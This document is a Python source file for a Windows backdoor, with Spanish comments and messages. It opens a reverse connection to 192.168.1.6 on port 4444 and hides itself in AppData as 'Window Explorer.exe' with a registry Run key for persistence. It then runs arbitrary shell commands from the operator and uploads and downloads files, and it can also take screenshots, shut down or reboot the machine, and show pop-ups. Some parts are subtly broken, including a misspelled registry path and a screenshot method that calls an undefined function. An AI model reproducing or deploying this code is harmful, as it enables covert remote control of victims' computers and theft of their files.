#!/usr/bin/env python
import socket
import subprocess
import json
import os
import time
import base64
import sys
import shutil
import pymsgbox
import platform

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent() #Desactivar por si se pone muy molesto. Usarlo solo en caso necesario y en uso de prueba usar Maquina Virtual
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Window Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Window\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def os(self):
        operating_system = platform.platform()
        return "[+] Sistema Operativo: " + operating_system

    def dir(self, path):
        os.chdir(path)
        return "[+] Cambiando directorio a " + path

    def descargar(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def subir(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Subido Correctamente."

    def captura(self):
        img = self.grab(childprocess=False)
        filename = os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S') + '.png')
        img.save(filename)
        return '[+] Captura guardada como: ' + filename

    def ip(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return "[+] Local IP: " + ip

    def host(self):
        host = socket.gethostname()
        return "[+] Nombre PC: " + host

    def apagar(self):
        os.system('shutdown /s /t 1')
        return '[+] Apagando Sistema'

    def reiniciar(self):
        os.system('shutdown /r /t 1')
        return '[+] Reiniciando el sistema'

    def alerta(self):
        texto_alerta =input('Texto Alerta: ')
        titulo_alerta = input('Titulo Alerta: ')
        boton_txt_alerta = input('Texto del Boton Alerta: ')

        pymsgbox.alert(text=texto_alerta, title=titulo_alerta, button=boton_txt_alerta)
        return '[+] Alerta enviada'

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "os":
                    res_comando = self.os()
                elif command[0] == "cd" and len(command) > 1:
                    res_comando = self.dir(command[1])
                elif command[0] == "descargar":
                    res_comando = self.descargar(command[1])
                elif command[0] == "subir":
                    res_comando = self.subir(command[1], command[2])
                elif command[0] == "captura":
                    res_comando = self.captura()
                elif command[0] == "ip":
                    res_comando = self.ip()
                elif command[0] == "host":
                    res_comando = self.host()
                elif command[0] == "apagar":
                    res_comando = self.apagar()
                elif command[0] == "reiniciar":
                    res_comando = self.reiniciar()
                elif command[0] == "alerta":
                    res_comando = self.alerta()
                else:
                    res_comando = self.execute_system_command(command)
            except Exception as e:
                res_comando = "[-] Error al ejecutar el comando."

            self.reliable_send(res_comando)


try:
    my_backdoor = Backdoor("192.168.1.6", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
